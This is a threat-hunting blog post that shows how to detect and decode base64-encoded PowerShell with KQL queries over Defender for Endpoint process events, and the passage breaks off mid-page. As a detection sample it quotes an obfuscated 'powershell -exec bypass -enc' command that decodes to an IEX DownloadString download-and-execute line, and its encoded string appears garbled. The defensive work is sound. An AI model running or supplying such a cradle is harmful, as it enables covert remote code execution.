::: {#mask}
:::
::: wrapper
::: {#header-desktop .desktop}
::: header-wrapper
::: header-title
[KQL Query](/ "Kusto Query Language | KQLQuery.com")
:::
::: menu
::: menu-inner
[Posts](/posts/){.menu-item} [Categories](/categories/){.menu-item}
[whoami](/whoami){.menu-item} [Projects](/projects){.menu-item} [KQL
News](https://kustoinsights.substack.com/){.menu-item
rel="noopener noreffer" target="_blank"}
[](https://github.com/bert-janp "GitHub"){.menu-item
rel="noopener noreffer" target="_blank"}
[](https://twitter.com/BertJanCyber "Twitter"){.menu-item
rel="noopener noreffer" target="_blank"}
[](https://linkedin.com/in/bert-janpals "LinkedIn"){.menu-item
rel="noopener noreffer" target="_blank"} []{.menu-item .delimiter}[
[](javascript:void(0); "Search"){#search-toggle-desktop .search-button
.search-toggle} [](javascript:void(0); "Clear"){#search-clear-desktop
.search-button .search-clear} []{#search-loading-desktop .search-button
.search-loading} ]{#search-desktop .menu-item
.search}[](javascript:void(0); "Switch Theme"){.menu-item .theme-switch}
:::
:::
:::
:::
::: {#header-mobile .mobile}
::: header-container
::: header-wrapper
::: header-title
[KQL Query](/ "Kusto Query Language | KQLQuery.com")
:::
::: {#menu-toggle-mobile .menu-toggle}
:::
:::
::: {#menu-mobile .menu}
::: search-wrapper
::: {#search-mobile .search .mobile}
[](javascript:void(0); "Search"){#search-toggle-mobile .search-button
.search-toggle} [](javascript:void(0); "Clear"){#search-clear-mobile
.search-button .search-clear} []{#search-loading-mobile .search-button
.search-loading}
:::
[Cancel](javascript:void(0);){#search-cancel-mobile .search-cancel}
:::
[Posts](/posts/){.menu-item}[Categories](/categories/){.menu-item}[whoami](/whoami){.menu-item}[Projects](/projects){.menu-item}[KQL
News](https://kustoinsights.substack.com/){.menu-item
rel="noopener noreffer"
target="_blank"}[](https://github.com/bert-janp "GitHub"){.menu-item
rel="noopener noreffer"
target="_blank"}[](https://twitter.com/BertJanCyber "Twitter"){.menu-item
rel="noopener noreffer"
target="_blank"}[](https://linkedin.com/in/bert-janpals "LinkedIn"){.menu-item
rel="noopener noreffer" target="_blank"}
[](javascript:void(0); "Switch Theme"){.menu-item .theme-switch}
:::
:::
:::
::: {.search-dropdown .desktop}
::: {#search-dropdown-desktop}
:::
:::
::: {.search-dropdown .mobile}
::: {#search-dropdown-mobile}
:::
:::
::: {.main role="main"}
::: container
# Threat Hunting: Encoded PowerShell {#threat-hunting-encoded-powershell .single-title .animate__animated .animate__flipInX}
::: post-meta
::: post-meta-line
[[Bert-Jan Pals](/ "Author"){.author
rel="author"}]{.post-author} [included in
[KQL](/categories/kql/) [Sentinel](/categories/sentinel/) [Defender For
Endpoint](/categories/defender-for-endpoint/) [Threat
Hunting](/categories/threat-hunting/) [PowerShell](/categories/powershell/)]{.post-category}
:::
::: post-meta-line
 2023-09-21  1358 words   7 minutes 
:::
:::
::: {#content .content}
Encoding is a something that has exsisted for decades and not new a new
created concept for information technology. In essence, encoding is the
transformation of data into a specific format or structure for secure
storage or efficient transmission. In ancient times, civilizations used
rudimentary encoding methods like the Caesar cipher to protect sensitive
messages from adversaries. As technology advanced, more sophisticated
encoding techniques were created, especially since computers could
easily decypher the contents. In the world of cyber adversaries use
encoding in a similar way, they want to write code that evades
detection. This blog will dive into the detection and decoding of
Encoded PowerShell using Defender For Endpoint data.
Powershell can be used encoded to obfucstate the commands that have been
executed. Those encoded executions are classified in [MITRE ATT&CK
technique T1027.010 (Obfuscated Files or Information: Command
Obfuscation)](https://attack.mitre.org/techniques/T1027/010/){target="_blank"
rel="noopener noreffer"}. An attacker can choose encoding to hide the
downloading of malicious files, or to prevent simple string matching
detections. The goal of this blog is to identify the systems that
execute encoded powershell and to classify the traffic as benign or
suspicious.
This blog specifically focusses on base64 encoded PowerShell Executions.
The
[base64_decode_tostring()](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/base64_decode_tostringfunction){target="_blank"
rel="noopener noreffer"} function can be used to encode all base64
encoded string, regardeless of the scripting language that is used.
# PowerShell Encoding
Before we can start hunting for any encoded PowerShell commands, we need
to understand what it is and what the incidcators of it are. For this
part is is important that the encoded PowerShell is directly executed,
the encoding of files is less interesting in this case. We build our
theory based on cases in which actors used encoded Powershell (see
section).
For all examples you can use KQL to translate this or any encoded base64
string, using the
[base64_decode_tostring()](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/base64_decode_tostringfunction){target="_blank"
rel="noopener noreffer"} function. This works for all base64 strings,
not only PowerShell. lo
::: highlight
``` {tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"}
let YourEncodedBase64Command = "SGV5IHRoZXJlISBOb3cgYWRkIHlvdXIgbWFsY2lvdXMgcGF5bG9hZCBpbiBoZXJlIQ==";
print base64_decode_tostring(YourEncodedBase64Command)
```
:::
## Example
Encoded:
::: highlight
``` {tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"}
powershell.exe -exec bypass -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHKACWB0AGUAbQAuAEAZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKAKQAUAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAAA6ACAALwA0ADUALgAxADMANgAuADIAMwAwACAWAADEAOgA0ADAAMAAwACAAyADMANABSADIAMWAnACkAOwA=
```
:::
Decoded:
``` {tabindex="0"}
powershell.exe -exec bypass -enc IEX (New-Object NetWebclient)DownloadString('http://127.0.0.1:32467/')
```
Source:
[https://blog.talosintelligence.com/avoslocker-new-arsenal/](https://blog.talosintelligence.com/avoslocker-new-arsenal/){target="_blank"
rel="noopener noreffer"}
Based on the example we can see that adversaries use PowerShell on the
commandline and a parameter to execute encoded powershell. This
paremeter can be used in differrent forms; *-encodedcommand*, *-enc* or
*-e*. Note that this execution also performs a bypass, which is
intersting for later detection.
::: {.details .admonition .note .open}
::: {.details-summary .admonition-title}
Threat Reports containing encoded base64 examples
:::
::: details-content
::: admonition-content
-   [https://blog.talosintelligence.com/avoslocker-new-arsenal/](https://blog.talosintelligence.com/avoslocker-new-arsenal/){target="_blank"
    rel="noopener noreffer"}
-   [https://www.linkedin.com/pulse/raas-avoslocker-incident-response-analysis-fl%C3%A1vio-costa?trk=articles_directory](https://www.linkedin.com/pulse/raas-avoslocker-incident-response-analysis-fl%C3%A1vio-costa?trk=articles_directory){target="_blank"
    rel="noopener noreffer"}
-   [https://threatresearch.ext.hp.com/how-ursnif-evades-detection/#post/0](https://threatresearch.ext.hp.com/how-ursnif-evades-detection/#post/0){target="_blank"
    rel="noopener noreffer"}
:::
:::
:::
# Step 1: List the devices that execute encoded PowerShell
In this step we list the devices that execute Powershell by the amount
of encoded PowerShell commands executed. This is done to analyse the
encoded PowerShell behaviour in for tenant and which parameters are
used. This can give an indication on which device needs to be
investigated further. Executing encoded scripts is not necacaraly
suspicious, several legitimate solutions are used in the wild, for
example to limit the script size.
The amount of encoded PowerShell executions can differ a lot in tenants,
thus this indication can shed some light on the current situation and if
we need to apply some filters to limit the results.
![Encoded PowerShell Executions
Statistics](/svg/loading.min.svg){.lazyload
data-src="/images/Hunting-encoded-powershell/PowerShellExecutions.png"
data-srcset="/images/Hunting-encoded-powershell/PowerShellExecutions.png, /images/Hunting-encoded-powershell/PowerShellExecutions.png 1.5x, /images/Hunting-encoded-powershell/PowerShellExecutions.png 2x"
data-sizes="auto"}
The query (below) investigates the *DeviceProcessEvents* for PowerShell
executions. The next step is to check if the commandline contains any of
the parameters in the EncodedList. If that is the case we extract the
base64 string from the commandline using regex. This string is than
decoded (but not used yet). Lastly we use the summarize operator to get
the count for each device.
::: highlight
``` {tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"}
let EncodedList = dynamic(['-encodedcommand', '-enc', '-e']); // -e and -en can also be added, be aware of FPs
let TimeFrame = 7d; //Customizable h = hours, d = days
DeviceProcessEvents
| where Timestamp > ago(TimeFrame)
| where ProcessCommandLine contains "powershell" or InitiatingProcessCommandLine contains "powershell"
| where ProcessCommandLine has_any (EncodedList) or InitiatingProcessCommandLine has_any (EncodedList)
| extend base64String = extract(@'\s+([A-Za-z0-9+/]{20}\S+$)', 1, ProcessCommandLine)
| extend DecodedCommandLine = base64_decode_tostring(base64String)
| where not(isempty(base64String) and isempty(DecodedCommandLine))
| summarize TotalEncodedExecutions = count() by DeviceName
| sort by TotalEncodedExecutions
```
:::
::: {.details .admonition .note .open}
::: {.details-summary .admonition-title}
Sentinel Analytics Rule
:::
::: details-content
::: admonition-content
The Sentinel query can be found on my GitHub:
[https://github.com/Bert-JanP/Hunting-Queries-Detection-Rules/blob/main/Defender%20For%20Endpoint/PowerShellEncodedCommandsByDevice.md](https://github.com/Bert-JanP/Hunting-Queries-Detection-Rules/blob/main/Defender%20For%20Endpoint/PowerShellEncodedCommandsByDevice.md){target="_blank"
rel="noopener noreffer"}